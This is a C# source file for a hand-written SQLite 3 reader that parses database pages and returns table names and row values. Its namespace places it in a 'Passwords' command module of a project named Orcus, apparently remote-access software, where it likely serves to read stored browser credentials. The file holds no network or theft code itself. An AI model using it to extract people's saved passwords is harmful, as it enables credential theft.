using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;

namespace Orcus.Commands.Passwords.Utilities
{
    // ReSharper disable once InconsistentNaming
    public class SQLiteHandler
    {
        private readonly byte[] _dbBytes;
        private readonly ulong _encoding;
        private readonly ushort _pageSize;
        private readonly byte[] _sqlDataTypeSize = {0, 1, 2, 3, 4, 6, 8, 8, 0, 0};
        private string[] _fieldNames;
        private sqlite_master_entry[] _masterTableEntries;
        private table_entry[] _tableEntries;

        public SQLiteHandler(string baseName)
        {
            if (File.Exists(baseName))
            {
                /*
                FileSystem.FileOpen(1, baseName, OpenMode.Binary, OpenAccess.Read, OpenShare.Shared, -1);
                string str = Strings.Space((int) FileSystem.LOF(1));
                FileSystem.FileGet(1, ref str, -1L, false);
                FileSystem.FileClose(new[] {1});
                */
                using (var fs = new FileStream(baseName, FileMode.Open, FileAccess.Read, FileShare.ReadWrite))
                {
                    _dbBytes = new byte[fs.Length];
                    fs.Read(_dbBytes, 0, (int) fs.Length - 1);
                }

                if (
                    string.Compare(Encoding.Default.GetString(_dbBytes, 0, 15), "SQLite format 3",
                        StringComparison.Ordinal) != 0)
                {
                    throw new Exception("Not a valid SQLite 3 Database File");
                }
                if (_dbBytes[0x34] != 0)
                {
                    throw new Exception("Auto-vacuum capable database is not supported");
                }
                //if (decimal.Compare(new decimal(this.ConvertToInteger(0x2c, 4)), 4M) >= 0)
                //{
                //    throw new Exception("No supported Schema layer file-format");
                //}
                _pageSize = (ushort) ConvertToInteger(0x10, 2);
                _encoding = ConvertToInteger(0x38, 4);
                if (decimal.Compare(new decimal(_encoding), decimal.Zero) == 0)
                {
                    _encoding = 1L;
                }
                ReadMasterTable(100L);
            }
        }

        private ulong ConvertToInteger(int startIndex, int size)
        {
            if ((size > 8) | (size == 0))
            {
                return 0L;
            }
            ulong num2 = 0L;
            int num4 = size - 1;
            for (int i = 0; i <= num4; i++)
            {
                num2 = (num2 << 8) | _dbBytes[startIndex + i];
            }
            return num2;
        }

        private long CVL(int startIndex, int endIndex)
        {
            endIndex++;
            byte[] buffer = new byte[8];
            int num4 = endIndex - startIndex;
            bool flag = false;
            if ((num4 == 0) | (num4 > 9))
            {
                return 0L;
            }
            if (num4 == 1)
            {
                buffer[0] = (byte) (_dbBytes[startIndex] & 0x7f);
                return BitConverter.ToInt64(buffer, 0);
            }
            if (num4 == 9)
            {
                flag = true;
            }
            int num2 = 1;
            int num3 = 7;
            int index = 0;
            if (flag)
            {
                buffer[0] = _dbBytes[endIndex - 1];
                endIndex--;
                index = 1;
            }
            int num7 = startIndex;
            for (int i = endIndex - 1; i >= num7; i += -1)
            {
                if (i - 1 >= startIndex)
                {
                    buffer[index] =
                        (byte)
                            (((byte) (_dbBytes[i] >> ((num2 - 1) & 7)) & (0xff >> num2)) |
                             (byte) (_dbBytes[i - 1] << (num3 & 7)));
                    num2++;
                    index++;
                    num3--;
                }
                else if (!flag)
                {
                    buffer[index] = (byte) ((byte) (_dbBytes[i] >> ((num2 - 1) & 7)) & (0xff >> num2));
                }
            }
            return BitConverter.ToInt64(buffer, 0);
        }

        public int GetRowCount()
        {
            return _tableEntries.Length;
        }

        public string[] GetTableNames()
        {
            string[] strArray2 = null;
            int index = 0;
            int num3 = _masterTableEntries.Length - 1;
            for (int i = 0; i <= num3; i++)
            {
                if (_masterTableEntries[i].item_type == "table")
                {
                    strArray2 = (string[]) CopyArray(strArray2, new string[index + 1]);
                    strArray2[index] = _masterTableEntries[i].item_name;
                    index++;
                }
            }
            return strArray2;
        }

        public string GetValue(int rowNum, int field)
        {
            if (rowNum >= _tableEntries.Length)
            {
                return null;
            }
            if (field >= _tableEntries[rowNum].content.Length)
            {
                return null;
            }
            return _tableEntries[rowNum].content[field];
        }

        public string GetValue(int rowNum, string field)
        {
            int num = -1;
            int length = _fieldNames.Length - 1;
            for (int i = 0; i <= length; i++)
            {
                if (_fieldNames[i].ToLower().CompareTo(field.ToLower()) == 0)
                {
                    num = i;
                    break;
                }
            }
            if (num == -1)
            {
                return null;
            }
            return GetValue(rowNum, num);
        }

        private int GVL(int startIndex)
        {
            if (startIndex > _dbBytes.Length)
            {
                return 0;
            }
            int num3 = startIndex + 8;
            for (int i = startIndex; i <= num3; i++)
            {
                if (i > _dbBytes.Length - 1)
                {
                    return 0;
                }
                if ((_dbBytes[i] & 0x80) != 0x80)
                {
                    return i;
                }
            }
            return startIndex + 8;
        }

        private bool IsOdd(long value)
        {
            return (value & 1L) == 1L;
        }

        private void ReadMasterTable(ulong offset)
        {
            if (_dbBytes[(int) offset] == 13)
            {
                ushort num2 =
                    Convert.ToUInt16(
                        decimal.Subtract(
                            new decimal(ConvertToInteger(Convert.ToInt32(decimal.Add(new decimal(offset), 3M)), 2)),
                            decimal.One));
                int length = 0;
                if (_masterTableEntries != null)
                {
                    length = _masterTableEntries.Length;
                    _masterTableEntries =
                        (sqlite_master_entry[])
                            CopyArray(_masterTableEntries,
                                new sqlite_master_entry[_masterTableEntries.Length + num2 + 1]);
                }
                else
                {
                    _masterTableEntries = new sqlite_master_entry[num2 + 1];
                }
                int num13 = num2;
                for (int i = 0; i <= num13; i++)
                {
                    ulong num =
                        ConvertToInteger(
                            Convert.ToInt32(decimal.Add(decimal.Add(new decimal(offset), 8M), new decimal(i*2))), 2);
                    if (decimal.Compare(new decimal(offset), 100M) != 0)
                    {
                        num += offset;
                    }
                    int endIndex = GVL((int) num);
                    long num7 = CVL((int) num, endIndex);
                    int num6 =
                        GVL(
                            Convert.ToInt32(
                                decimal.Add(
                                    decimal.Add(new decimal(num),
                                        decimal.Subtract(new decimal(endIndex), new decimal(num))), decimal.One)));
                    _masterTableEntries[length + i].row_id =
                        CVL(
                            Convert.ToInt32(
                                decimal.Add(
                                    decimal.Add(new decimal(num),
                                        decimal.Subtract(new decimal(endIndex), new decimal(num))), decimal.One)), num6);
                    num =
                        Convert.ToUInt64(
                            decimal.Add(
                                decimal.Add(new decimal(num), decimal.Subtract(new decimal(num6), new decimal(num))),
                                decimal.One));
                    endIndex = GVL((int) num);
                    num6 = endIndex;
                    long num5 = CVL((int) num, endIndex);
                    long[] numArray = new long[5];
                    int index = 0;
                    do
                    {
                        endIndex = num6 + 1;
                        num6 = GVL(endIndex);
                        numArray[index] = CVL(endIndex, num6);
                        if (numArray[index] > 9L)
                        {
                            if (IsOdd(numArray[index]))
                            {
                                numArray[index] = (long) Math.Round((numArray[index] - 13L)/2.0);
                            }
                            else
                            {
                                numArray[index] = (long) Math.Round((numArray[index] - 12L)/2.0);
                            }
                        }
                        else
                        {
                            numArray[index] = _sqlDataTypeSize[(int) numArray[index]];
                        }
                        index++;
                    } while (index <= 4);
                    if (decimal.Compare(new decimal(_encoding), decimal.One) == 0)
                    {
                        _masterTableEntries[length + i].item_type = Encoding.Default.GetString(_dbBytes,
                            Convert.ToInt32(decimal.Add(new decimal(num), new decimal(num5))), (int) numArray[0]);
                    }
                    else if (decimal.Compare(new decimal(_encoding), 2M) == 0)
                    {
                        _masterTableEntries[length + i].item_type = Encoding.Unicode.GetString(_dbBytes,
                            Convert.ToInt32(decimal.Add(new decimal(num), new decimal(num5))), (int) numArray[0]);
                    }
                    else if (decimal.Compare(new decimal(_encoding), 3M) == 0)
                    {
                        _masterTableEntries[length + i].item_type = Encoding.BigEndianUnicode.GetString(_dbBytes,
                            Convert.ToInt32(decimal.Add(new decimal(num), new decimal(num5))), (int) numArray[0]);
                    }
                    if (decimal.Compare(new decimal(_encoding), decimal.One) == 0)
                    {
                        _masterTableEntries[length + i].item_name = Encoding.Default.GetString(_dbBytes,
                            Convert.ToInt32(decimal.Add(decimal.Add(new decimal(num), new decimal(num5)),
                                new decimal(numArray[0]))), (int) numArray[1]);
                    }
                    else if (decimal.Compare(new decimal(_encoding), 2M) == 0)
                    {
                        _masterTableEntries[length + i].item_name = Encoding.Unicode.GetString(_dbBytes,
                            Convert.ToInt32(decimal.Add(decimal.Add(new decimal(num), new decimal(num5)),
                                new decimal(numArray[0]))), (int) numArray[1]);
                    }
                    else if (decimal.Compare(new decimal(_encoding), 3M) == 0)
                    {
                        _masterTableEntries[length + i].item_name = Encoding.BigEndianUnicode.GetString(_dbBytes,
                            Convert.ToInt32(decimal.Add(decimal.Add(new decimal(num), new decimal(num5)),
                                new decimal(numArray[0]))), (int) numArray[1]);
                    }
                    _masterTableEntries[length + i].root_num =
                        (long)
                            ConvertToInteger(
                                Convert.ToInt32(
                                    decimal.Add(
                                        decimal.Add(
                                            decimal.Add(decimal.Add(new decimal(num), new decimal(num5)),
                                                new decimal(numArray[0])), new decimal(numArray[1])),
                                        new decimal(numArray[2]))), (int) numArray[3]);
                    if (decimal.Compare(new decimal(_encoding), decimal.One) == 0)
                    {
                        _masterTableEntries[length + i].sql_statement = Encoding.Default.GetString(_dbBytes,
                            Convert.ToInt32(
                                decimal.Add(
                                    decimal.Add(
                                        decimal.Add(
                                            decimal.Add(decimal.Add(new decimal(num), new decimal(num5)),
                                                new decimal(numArray[0])), new decimal(numArray[1])),
                                        new decimal(numArray[2])), new decimal(numArray[3]))), (int) numArray[4]);
                    }
                    else if (decimal.Compare(new decimal(_encoding), 2M) == 0)
                    {
                        _masterTableEntries[length + i].sql_statement = Encoding.Unicode.GetString(_dbBytes,
                            Convert.ToInt32(
                                decimal.Add(
                                    decimal.Add(
                                        decimal.Add(
                                            decimal.Add(decimal.Add(new decimal(num), new decimal(num5)),
                                                new decimal(numArray[0])), new decimal(numArray[1])),
                                        new decimal(numArray[2])), new decimal(numArray[3]))), (int) numArray[4]);
                    }
                    else if (decimal.Compare(new decimal(_encoding), 3M) == 0)
                    {
                        _masterTableEntries[length + i].sql_statement = Encoding.BigEndianUnicode.GetString(_dbBytes,
                            Convert.ToInt32(
                                decimal.Add(
                                    decimal.Add(
                                        decimal.Add(
                                            decimal.Add(decimal.Add(new decimal(num), new decimal(num5)),
                                                new decimal(numArray[0])), new decimal(numArray[1])),
                                        new decimal(numArray[2])), new decimal(numArray[3]))), (int) numArray[4]);
                    }
                }
            }
            else if (_dbBytes[offset] == 5)
            {
                ushort num11 =
                    Convert.ToUInt16(
                        decimal.Subtract(
                            new decimal(ConvertToInteger(Convert.ToInt32(decimal.Add(new decimal(offset), 3M)), 2)),
                            decimal.One));
                int num14 = num11;
                for (int j = 0; j <= num14; j++)
                {
                    ushort startIndex =
                        (ushort)
                            ConvertToInteger(
                                Convert.ToInt32(decimal.Add(decimal.Add(new decimal(offset), 12M), new decimal(j*2))), 2);
                    ReadMasterTable(decimal.Compare(new decimal(offset), 100M) == 0
                        ? Convert.ToUInt64(
                            decimal.Multiply(
                                decimal.Subtract(new decimal(ConvertToInteger(startIndex, 4)), decimal.One),
                                new decimal(_pageSize)))
                        : Convert.ToUInt64(
                            decimal.Multiply(
                                decimal.Subtract(new decimal(ConvertToInteger((int) (offset + startIndex), 4)),
                                    decimal.One), new decimal(_pageSize))));
                }
                ReadMasterTable(
                    Convert.ToUInt64(
                        decimal.Multiply(
                            decimal.Subtract(
                                new decimal(ConvertToInteger(Convert.ToInt32(decimal.Add(new decimal(offset), 8M)), 4)),
                                decimal.One), new decimal(_pageSize))));
            }
        }

        public bool ReadTable(string tableName)
        {
            int index = -1;
            int length = _masterTableEntries.Length - 1;
            for (int i = 0; i <= length; i++)
            {
                if (_masterTableEntries[i].item_name.ToLower().CompareTo(tableName.ToLower()) == 0)
                {
                    index = i;
                    break;
                }
            }
            if (index == -1)
            {
                return false;
            }
            string[] strArray =
                _masterTableEntries[index].sql_statement.Substring(
                    _masterTableEntries[index].sql_statement.IndexOf("(") + 1).Split(',');
            int num6 = strArray.Length - 1;
            for (int j = 0; j <= num6; j++)
            {
                strArray[j] = strArray[j].TrimStart();
                int num4 = strArray[j].IndexOf(" ");
                if (num4 > 0)
                {
                    strArray[j] = strArray[j].Substring(0, num4);
                }
                if (strArray[j].IndexOf("UNIQUE") == 0)
                {
                    break;
                }
                _fieldNames = (string[]) CopyArray(_fieldNames, new string[j + 1]);
                _fieldNames[j] = strArray[j];
            }
            return ReadTableFromOffset((ulong) ((_masterTableEntries[index].root_num - 1L)*_pageSize));
        }

        private bool ReadTableFromOffset(ulong offset)
        {
            if (_dbBytes[offset] == 13)
            {
                int num2 =
                    Convert.ToInt32(
                        decimal.Subtract(
                            new decimal(ConvertToInteger(Convert.ToInt32(decimal.Add(new decimal(offset), 3M)), 2)),
                            decimal.One));
                int length = 0;
                if (_tableEntries != null)
                {
                    length = _tableEntries.Length;
                    _tableEntries =
                        (table_entry[])
                            CopyArray(_tableEntries, new table_entry[_tableEntries.Length + num2 + 1]);
                }
                else
                {
                    _tableEntries = new table_entry[num2 + 1];
                }
                int num16 = num2;
                for (int i = 0; i <= num16; i++)
                {
                    record_header_field[] _fieldArray = null;
                    ulong num =
                        ConvertToInteger(
                            Convert.ToInt32(decimal.Add(decimal.Add(new decimal(offset), 8M), new decimal(i*2))), 2);
                    if (decimal.Compare(new decimal(offset), 100M) != 0)
                    {
                        num += offset;
                    }
                    int endIndex = GVL((int) num);
                    long num9 = CVL((int) num, endIndex);
                    int num8 =
                        GVL(
                            Convert.ToInt32(
                                decimal.Add(
                                    decimal.Add(new decimal(num),
                                        decimal.Subtract(new decimal(endIndex), new decimal(num))), decimal.One)));
                    _tableEntries[length + i].row_id =
                        CVL(
                            Convert.ToInt32(
                                decimal.Add(
                                    decimal.Add(new decimal(num),
                                        decimal.Subtract(new decimal(endIndex), new decimal(num))), decimal.One)), num8);
                    num =
                        Convert.ToUInt64(
                            decimal.Add(
                                decimal.Add(new decimal(num), decimal.Subtract(new decimal(num8), new decimal(num))),
                                decimal.One));
                    endIndex = GVL((int) num);
                    num8 = endIndex;
                    long num7 = CVL((int) num, endIndex);
                    long num10 =
                        Convert.ToInt64(decimal.Add(decimal.Subtract(new decimal(num), new decimal(endIndex)),
                            decimal.One));
                    for (int j = 0; num10 < num7; j++)
                    {
                        _fieldArray =
                            (record_header_field[]) CopyArray(_fieldArray, new record_header_field[j + 1]);
                        endIndex = num8 + 1;
                        num8 = GVL(endIndex);
                        _fieldArray[j].type = CVL(endIndex, num8);
                        if (_fieldArray[j].type > 9L)
                        {
                            if (IsOdd(_fieldArray[j].type))
                            {
                                _fieldArray[j].size = (long) Math.Round((_fieldArray[j].type - 13L)/2.0);
                            }
                            else
                            {
                                _fieldArray[j].size = (long) Math.Round((_fieldArray[j].type - 12L)/2.0);
                            }
                        }
                        else
                        {
                            _fieldArray[j].size = _sqlDataTypeSize[_fieldArray[j].type];
                        }
                        num10 = num10 + (num8 - endIndex) + 1L;
                    }
                    _tableEntries[length + i].content = new string[_fieldArray.Length - 1 + 1];
                    int num4 = 0;
                    int num17 = _fieldArray.Length - 1;
                    for (int k = 0; k <= num17; k++)
                    {
                        if (_fieldArray[k].type > 9L)
                        {
                            if (!IsOdd(_fieldArray[k].type))
                            {
                                if (decimal.Compare(new decimal(_encoding), decimal.One) == 0)
                                {
                                    _tableEntries[length + i].content[k] = Encoding.Default.GetString(_dbBytes,
                                        Convert.ToInt32(decimal.Add(decimal.Add(new decimal(num), new decimal(num7)),
                                            new decimal(num4))), (int) _fieldArray[k].size);
                                }
                                else if (decimal.Compare(new decimal(_encoding), 2M) == 0)
                                {
                                    _tableEntries[length + i].content[k] = Encoding.Unicode.GetString(_dbBytes,
                                        Convert.ToInt32(decimal.Add(decimal.Add(new decimal(num), new decimal(num7)),
                                            new decimal(num4))), (int) _fieldArray[k].size);
                                }
                                else if (decimal.Compare(new decimal(_encoding), 3M) == 0)
                                {
                                    _tableEntries[length + i].content[k] = Encoding.BigEndianUnicode.GetString(
                                        _dbBytes,
                                        Convert.ToInt32(decimal.Add(decimal.Add(new decimal(num), new decimal(num7)),
                                            new decimal(num4))), (int) _fieldArray[k].size);
                                }
                            }
                            else
                            {
                                _tableEntries[length + i].content[k] = Encoding.Default.GetString(_dbBytes,
                                    Convert.ToInt32(decimal.Add(decimal.Add(new decimal(num), new decimal(num7)),
                                        new decimal(num4))), (int) _fieldArray[k].size);
                            }
                        }
                        else
                        {
                            _tableEntries[length + i].content[k] =
                                ConvertToInteger(
                                    Convert.ToInt32(decimal.Add(decimal.Add(new decimal(num), new decimal(num7)),
                                        new decimal(num4))), (int) _fieldArray[k].size).ToString(null, null);
                        }
                        num4 += (int) _fieldArray[k].size;
                    }
                }
            }
            else if (_dbBytes[(int) offset] == 5)
            {
                ushort num14 =
                    Convert.ToUInt16(
                        decimal.Subtract(
                            new decimal(ConvertToInteger(Convert.ToInt32(decimal.Add(new decimal(offset), 3M)), 2)),
                            decimal.One));
                int num18 = num14;
                for (int m = 0; m <= num18; m++)
                {
                    ushort num13 =
                        (ushort)
                            ConvertToInteger(
                                Convert.ToInt32(decimal.Add(decimal.Add(new decimal(offset), 12M), new decimal(m*2))), 2);
                    ReadTableFromOffset(
                        Convert.ToUInt64(
                            decimal.Multiply(
                                decimal.Subtract(new decimal(ConvertToInteger((int) (offset + num13), 4)), decimal.One),
                                new decimal(_pageSize))));
                }
                ReadTableFromOffset(
                    Convert.ToUInt64(
                        decimal.Multiply(
                            decimal.Subtract(
                                new decimal(ConvertToInteger(Convert.ToInt32(decimal.Add(new decimal(offset), 8M)), 4)),
                                decimal.One), new decimal(_pageSize))));
            }
            return true;
        }

        private static Array CopyArray(Array arySrc, Array aryDes)
        {
            if (arySrc == null)
                return aryDes;

            if (aryDes == null)
                return arySrc;

            Array.Copy(arySrc, aryDes, arySrc.Length);
            return aryDes;
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct record_header_field
        {
            public long size;
            public long type;
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct sqlite_master_entry
        {
            public long row_id;
            public string item_type;
            public string item_name;
            public string astable_name;
            public long root_num;
            public string sql_statement;
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct table_entry
        {
            public long row_id;
            public string[] content;
        }
    }
}